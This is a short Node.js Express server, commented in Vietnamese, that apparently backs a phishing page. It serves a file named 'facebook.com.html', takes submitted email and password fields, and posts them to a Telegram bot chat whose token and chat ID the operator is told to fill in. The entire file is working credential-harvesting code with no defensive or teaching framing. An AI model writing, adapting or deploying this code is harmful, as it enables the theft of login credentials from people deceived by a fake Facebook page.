require("dotenv").config();
const express = require("express");
const axios = require("axios");
const cors = require("cors");

const app = express();
app.use(express.json());
app.use(cors());

// 🔥 THAY 2 CÁI NÀY
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
app.post("/submit", async (req, res) => {
  const { password, email } = req.body;

  try {
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: `Có dữ liệu mới:\nTên: ${password}\nEmail: ${email}`,
    });

    res.json({ success: true });
  } catch (err) {
    console.log(err.message);
    res.json({ success: false });
  }
});

const port = process.env.PORT || 3000;
const path = require("path");

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "facebook.com.html"));
});
app.listen(port, () => {
  console.log("Server running...");
});
